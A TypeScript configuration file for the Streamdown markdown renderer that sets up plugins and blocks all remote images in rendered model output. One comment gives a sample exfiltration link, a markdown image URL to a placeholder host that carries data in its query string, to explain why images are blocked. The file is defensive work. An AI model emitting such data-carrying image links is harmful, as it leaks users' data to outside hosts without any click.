import { cjk } from "@streamdown/cjk";
import { code } from "@streamdown/code";
import { createMathPlugin } from "@streamdown/math";
import remarkBreaks from "remark-breaks";
import { defaultRehypePlugins, type PluginConfig, type StreamdownProps } from "streamdown";

// Type-only version skew: @streamdown/code bundles shiki@3 types while
// streamdown@2.5 expects shiki@4 types. Both work at runtime (each ships its
// own highlighter); the cast papers over the .d.ts mismatch.
//
// Standard dollar authoring (owner, 2026-10-12): $...$ inline, $$ fenced
// on separate lines for display. transformMathDelimiters stays as the
// compatibility reader for old \(...\)/\[...\] content; its two-dollar
// output remains valid alongside native single-dollar math.
//
// remark-breaks rides in the cjk plugin's remarkPluginsAfter slot (public
// PluginConfig API): Streamdown's bare `remarkPlugins` PROP would REPLACE the
// defaults ([remark-gfm, codeMeta]), silently dropping GFM and code-fence
// metastring parsing. The slot appends after the defaults, which is the
// standard remark-gfm → remark-breaks order.
//
// MERMAID is app-owned since the chrome-melt wave (2026-09-19): the md-blocks
// `code` override intercepts mermaid fences and renders via
// components/mermaid-render.ts — streamdown's internal mermaid machinery
// (the plugin entry + the `mermaid` prop) is retired with it.
export const streamdownPlugins = {
  cjk: {
    ...cjk,
    remarkPluginsAfter: [...cjk.remarkPluginsAfter, remarkBreaks],
  },
  code,
  math: createMathPlugin({ singleDollarTextMath: true }),
} as unknown as PluginConfig;

// Remend's incomplete-HTML heuristic mistakes `<b` in `$a<b$` for a
// partial tag and deletes the remaining source before math can tokenize.
// Preserve that text (unfinished prose HTML may show literally); Streamdown's
// separate sanitization/hardening and all other Markdown repairs stay enabled.
export const streamdownRemend = { htmlTags: false };

// Model output must not load remote images: a rendered
// ![x](https://host/?d=...) sends data out with no click. Streamdown's
// default harden step allows every image prefix, so this keeps its
// raw → sanitize → harden pipeline and changes one option. A blocked image
// becomes an "[Image blocked: alt]" badge. data: images were already
// blocked by the sanitize step; the app's image and SVG cards don't render
// through markdown. Links are unchanged.
const [hardenPlugin, hardenOptions] = defaultRehypePlugins.harden as [unknown, Record<string, unknown>];
export const streamdownRehypePlugins = Object.values({
  ...defaultRehypePlugins,
  harden: [hardenPlugin, { ...hardenOptions, allowedImagePrefixes: [] }],
}) as NonNullable<StreamdownProps["rehypePlugins"]>;
